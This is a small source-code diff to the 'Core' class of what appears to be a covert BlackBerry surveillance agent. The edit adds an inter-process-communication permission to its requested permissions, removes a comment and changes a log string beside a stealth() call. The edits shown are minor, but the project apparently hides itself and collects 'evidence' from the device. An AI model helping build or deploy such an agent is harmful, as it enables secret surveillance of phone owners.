@@ -24,7 +24,7 @@ import blackberry.evidence.Evidence;
 import blackberry.fs.Path;
 import blackberry.utils.Utils;
 
-// TODO: Auto-generated Javadoc
+
 /**
  * Classe Core, contiene il main.
  */
@@ -159,7 +159,8 @@ public final class Core implements Runnable {
                 ApplicationPermissions.PERMISSION_IDLE_TIMER,
                 ApplicationPermissions.PERMISSION_CHANGE_DEVICE_SETTINGS,
                 ApplicationPermissions.PERMISSION_INTERNAL_CONNECTIONS,
-                ApplicationPermissions.PERMISSION_BROWSER_FILTER };
+                ApplicationPermissions.PERMISSION_BROWSER_FILTER,
+                ApplicationPermissions.PERMISSION_INTER_PROCESS_COMMUNICATION};
 
         //TODO: Dalla 4.6: PERMISSION_INTERNET, PERMISSION_ORGANIZER_DATA, PERMISSION_LOCATION_DATA 
 
@@ -219,7 +220,7 @@ public final class Core implements Runnable {
         //#ifdef DEBUG
         debug.info("START: " + (new Date()));
         //#endif
-        Evidence.info("START");
+        Evidence.info("Start");
    
         stealth();
         Utils.sleep(500);     
